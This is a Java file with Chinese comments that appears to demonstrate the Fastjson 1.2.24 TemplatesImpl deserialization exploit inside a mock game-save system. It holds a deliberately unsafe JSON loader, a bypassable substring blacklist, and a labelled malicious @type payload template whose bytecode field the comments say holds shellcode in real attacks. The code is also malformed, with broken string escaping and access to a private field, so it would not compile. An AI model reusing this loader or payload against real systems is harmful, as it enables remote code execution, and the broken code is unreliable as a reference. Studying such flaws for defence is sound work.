import java.io.*;
import java.util.*;
import com.alibaba.fastjson.JSON;

// 模拟桌面游戏存档系统
class Player implements Serializable {
    private String name;
    private int level;
    private transient Runtime runtime = Runtime.getRuntime(); // 潜在危险字段
    
    // 元编程风格的动态方法调用
    public Object dynamicInvoke(String methodName, Object... args) throws Exception {
        return getClass().getMethod(methodName, Arrays.stream(args).map(Object::getClass).toArray(Class[]::new))
                      .invoke(this, args);
    }
}

class GameSaver {
    // 不安全的反序列化入口点
    public static Player loadPlayer(String unsafeData) {
        // Fastjson 1.2.24版本存在TemplatesImpl链漏洞
        // 错误地启用autotype导致任意类加载
        return JSON.parseObject(unsafeData, Player.class);
    }

    // 自定义黑名单配置（存在绕过可能）
    private Class<?> resolveClass(ObjectInputStream s) throws IOException, ClassNotFoundException {
        String className = s.readUTF();
        if (className.contains("TemplatesImpl")) {
            throw new InvalidClassException("Forbidden class");
        }
        return Class.forName(className);
    }
}

// 攻击载荷示例
public class GameLauncher {
    public static void main(String[] args) throws Exception {
        // 正常流程
        String safeData = "{\\"name\\":\\"Hero\\",\\"level\\":10}";
        Player p1 = GameSaver.loadPlayer(safeData);
        System.out.println("正常加载: " + p1.name);

        // 构造恶意JSON载荷（使用TemplatesImpl链）
        String maliciousJson = "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\","
            + "\\"_bytecodes\\":["Base64EncodedMaliciousBytecode"]," // 实际攻击中包含shellcode
            + "\\"_name\\":\\"a\\",\\"_tfactory\\":{},\\"_outputProperties\\":{}}";

        // 模拟攻击触发
        try {
            Player p2 = GameSaver.loadPlayer(maliciousJson);
        } catch (Exception e) {
            System.out.println("预期异常：" + e.getMessage());
            // 实际攻击中此处已执行恶意代码
        }
    }
}

// 编译说明：需要fastjson-1.2.24.jar
// 编译命令：javac -cp fastjson-1.2.24.jar GameLauncher.java